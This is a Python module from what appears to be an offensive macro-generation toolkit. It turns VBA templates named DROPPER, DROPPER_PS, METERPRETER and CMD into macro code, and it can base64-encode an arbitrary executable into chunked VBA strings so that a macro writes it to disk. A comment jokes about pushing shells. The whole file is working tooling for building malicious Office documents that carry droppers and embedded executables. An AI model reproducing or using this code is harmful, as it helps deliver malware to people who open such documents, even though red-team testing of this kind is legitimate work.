#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import shlex
import os
import logging
from modules.mp_module import MpModule
from common import templates, utils
import base64


class TemplateToVba(MpModule):
    """ Generate a VBA document from a given template """
        
    def _fillGenericTemplate(self, content, values):
        for value in values:
            content = content.replace("<<<TEMPLATE>>>", value, 1)
        
        # generate random file name
        vbaFile = os.path.abspath(os.path.join(self.workingPath,utils.randomAlpha(9)+".vba"))
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        # Write in new file 
        f = open(vbaFile, 'w')
        f.write(content)
        f.close()


    ############
    ### added check for procedure too large error (65535b) + the variable space.  
    ### We are going to split in chunks of 50000 to ensure we are under the cap
    ### VBA/Macro has a limit of 65534 lines as well.  Is this per macro or per procedure? 
    ### so 1001 * 65490ish lines, should give us theoretical max of something around 65M bytes for now. 
    ### Should more than enough for any shell anyone is trying to push ;-)
    ############
    
    def _formStr2(self, varstr, instr):
        holder = []
        str2 = ''
        str1 = '\n ' + varstr + ' = "' + instr[:1007] + '"' 
        for i in range(1007, len(instr), 1001):
            holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+1001])
            str2 = '"\n'.join(holder)
        
        str2 = str2 + "\""
        str1 = str1 + "\n"+str2
        return str1
    
    def _formStr(self, varstr, instr):
        holder = []
        str2 = ''
        str1 = '\n ' + varstr + ' = "' + instr[:957] + '"' 
        for i in range(957, len(instr), 951):
            holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+951])
            str2 = '"\n '.join(holder)
        
        str2 = str2 + "\""
        str1 = str1 + "\n "+str2
        return str1


    def _processEmbedExeTemplate(self):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":
            logging.error("   [!] Could not find template parameters!")
            return
        f = open(cmdFile, 'r')
        valuesFileContent = f.read()
        f.close()
        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
        inputExe = params[0]
        outputPath=None
        if len(params) > 1:
            outputPath = params[1]
        else:
            outputPath = utils.randomAlpha(5)+".exe"
        logging.info("   [-] Output path when exe is extracted: %s" % outputPath)
            
        #OPEN THE FILE
        if os.path.isfile(inputExe): 
            todo = open(inputExe, 'rb').read()
        else: 
            logging.error("    [!] Could not find %s" % inputExe)
            return
        
        #ENCODE THE FILE
        logging.info("   [-] Encoding %d bytes" % (len(todo), ))
        b64 = base64.b64encode(todo).decode()    
        logging.info("   [-] Encoded data is %d bytes" % (len(b64), ))
        b64 = b64.replace("\n","")

        x=50000
        strs = [b64[i:i+x] for i in range(0, len(b64), x)]
        for j in range(len(strs)):
            ##### Avoids "Procedure too large error with large executables" #####
            strs[j] = self._formStr("var"+str(j),strs[j])
        
        sub_proc=""
        for i in range(len(strs)):
            sub_proc = sub_proc + "Private Function var"+str(i)+" As String\n"
            sub_proc = sub_proc + ""+strs[i]
            sub_proc = sub_proc + "\nEnd Function\n"
        
        chunksDecode = ""
        for l in range (len(strs) ):
            chunksDecode += "\tDim chunk"+str(l)+" As String\n"
            chunksDecode += "\tchunk"+str(l)+" = var"+str(l)+"()\n"
            chunksDecode += "\tout1 = out1 + chunk"+str(l)+"\n"

        content = templates.EMBED_EXE
        content = content.replace("<<<STRINGS>>>", sub_proc)
        content = content.replace("<<<DECODE_CHUNKS>>>", chunksDecode)
        content = content.replace("<<<OUT_FILE>>>", outputPath)
        #top + next + then1 + sub_proc+ sub_open
        # generate random file name
        vbaFile = os.path.abspath(os.path.join(self.workingPath,utils.randomAlpha(9)+".vba"))
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        # Write in new file 
        f = open(vbaFile, 'w')
        f.write(content)
        f.close()
        os.remove(cmdFile)
        logging.info("   [-] OK!")

    
    def run(self):
        logging.info(" [+] Generating VBA document from template...")
        if self.template is None:
            logging.info("   [!] No template defined")
            return
        
        if self.template == "HELLO":
            content = templates.HELLO
        elif self.template == "DROPPER":
            content = templates.DROPPER
        elif self.template == "DROPPER2":
            content = templates.DROPPER2
        elif self.template == "DROPPER_PS":
            content = templates.DROPPER_PS
        elif self.template == "METERPRETER":
            content = templates.METERPRETER
        elif self.template == "CMD":
            content = templates.CMD
        elif self.template == "EMBED_EXE":
            # More complexe template, not the usual treatment
            self._processEmbedExeTemplate()
            return
        else: # if not one of default template suppose its a custom template
            if os.path.isfile(self.template):
                f = open(self.template, 'r')
                content = f.read()
                f.close()
            else:
                logging.info("   [!] Template is not recognized as file or default template.")
                return
         
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is not None:
            f = open(cmdFile, 'r')
            valuesFileContent = f.read()
            f.close()
            self._fillGenericTemplate(content, shlex.split(valuesFileContent)) # split on space but preserve what is between quotes
            # remove file containing template values
            os.remove(cmdFile)
            logging.info("   [-] OK!") 
        else:
            logging.error("   [!] Could not find template input!")
